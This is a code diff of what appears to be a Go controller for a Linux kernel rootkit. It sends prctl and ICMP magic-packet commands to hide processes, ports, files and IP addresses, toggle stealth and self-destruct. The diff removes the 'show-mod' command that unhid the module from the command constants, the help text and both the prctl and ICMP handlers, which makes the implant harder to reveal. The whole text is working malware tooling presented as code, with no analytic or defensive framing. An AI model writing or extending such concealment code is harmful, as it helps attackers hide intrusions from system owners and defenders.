@@ -22,7 +22,6 @@ const (
 	CMDHidePID      = 0x01
 	CMDHidePort     = 0x02
 	CMDHideFile     = 0x03
-	CMDShowMod      = 0x04
 	CMDStealth      = 0x06
 	CMDHideIP       = 0x12
 	CMDHideIPPort   = 0x13
@@ -68,7 +67,6 @@ Prctl actions:
   hide-ip <ip>
   hide-ipport <ip> <port>
   clear
-  show-mod
   stealth <0|1>
   self-destruct
 
@@ -86,7 +84,6 @@ ICMP actions:
   hide-ipport <ip> <port>
   set-key <new-magic> <new-key>
   clear
-  show-mod
   stealth <0|1>
   self-destruct`)
 }
@@ -117,8 +114,6 @@ func runPrctl(args []string) {
 		err = prctlHideIPPort(tail)
 	case "clear":
 		err = prctlSimple(CMDClear, "All hidden items cleared")
-	case "show-mod":
-		err = prctlSimple(CMDShowMod, "Module unhidden")
 	case "stealth":
 		err = prctlStealth(tail)
 	case "self-destruct":
@@ -296,8 +291,6 @@ func runIcmp(args []string) {
 		payload, err = icmpSetKey(tail, k)
 	case "clear":
 		payload, err = buildPayload(CMDClear, nil, k)
-	case "show-mod":
-		payload, err = buildPayload(CMDShowMod, nil, k)
 	case "stealth":
 		payload, err = icmpStealth(tail, k)
 	case "self-destruct":
